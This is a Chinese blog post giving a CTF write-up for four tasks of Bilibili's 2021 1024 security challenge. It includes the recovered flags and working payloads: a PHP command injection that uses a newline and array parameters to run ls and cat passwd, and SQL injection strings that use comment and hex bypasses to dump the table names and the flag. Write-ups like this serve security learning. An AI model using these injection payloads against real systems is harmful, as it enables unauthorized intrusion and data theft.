---
title: "Bilibili 1024安全攻防 Wp"
slug: "bilibili-sec1024-wp"
description: "只有前4个，水着玩一玩"
date: 2021-11-14T20:15:47+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## 安全攻防--1

> https://security.bilibili.com/sec1024/q/r1.html  | [提示](https://baike.baidu.com/item/高级加密标准/468774)
>
> 1024程序员节，大家一起和2233参与解密游戏吧~
> happy_1024_2233:
> e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364
> 0408abca7deabb96a58f50471171b60e02b1a8dbd32db156

![image-20211114154001444](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154001444.png)

`a1cd5f84-27966146-3776f301-64031bb9`

## 安全攻防--2

> https://security.bilibili.com/sec1024/q/  |  [提示](https://cli.vuejs.org/zh/config/#productionsourcemap)
>
> 某高级前端开发攻城狮更改了一个前端配置项

提示中给的是vue的官方文档，并且定位到了productionSourceMap

来一波f12

![image-20211114154330638](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154330638.png)

`36c7a7b4-cda04af0-8db0368d-b5166480`

## 安全攻防--3

> https://security.bilibili.com/sec1024/q/eval.zip  |  [提示](https://www.php.net/manual/zh/function.preg-match.php)
>
> PHP is the best language for web programming, but what about other languages?

```php
<?php
    /*
        bilibili- ( ゜- ゜)つロ 乾杯~
        uat: http://192.168.3.2/uat/eval.php
        pro: http://security.bilibili.com/sec1024/q/pro/eval.php
    */
    $args = @$_GET['args'];
    if (count($args) >3) {
        exit();
    }
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) ) {
            exit();
        }
    }
    // todo: other filter
    $cmd = "/bin/2233 " . implode(" ", $args);
    exec($cmd, $out);
    for ($i=0; $i<count($out); $i++){
        echo($out[$i]);
        echo('<br>');
    }
?>

```

可以get方式接收最多3个名为args的参数，对每个参数的值进行正则匹配，最后拼接到$cmd后面被exec执行，用%0a换行+数组[]绕过

payload

```
https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&args[]=ls
https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&args[]=cat&args[]=passwd
```

`9d3c3014-6c6267e7-086aaee5-1f18452a`

## 安全攻防--4

> https://security.bilibili.com/sec1024/q/  |  [提示](https://baike.baidu.com/item/sql注入/150289)
>
> 懂的都懂

有个请求api https://security.bilibili.com/sec1024/q/admin/api/v1/log/list，本能的去fuzz一下，结果412了……QAQ

username部分可以sqli，过滤了空格和单引号，用注释和16进制绕过

payload

```json
"user_name": "1/**/union/**/select/**/database(),user(),3,4,5",
"user_name": "1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#",
"user_name": "1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#",
```

`3d5dd579-0678ef93-18b70cae-cabc5d51`

------

难度应该算是偏简单的，就是，emmmmmmmmmm

算了，我不好说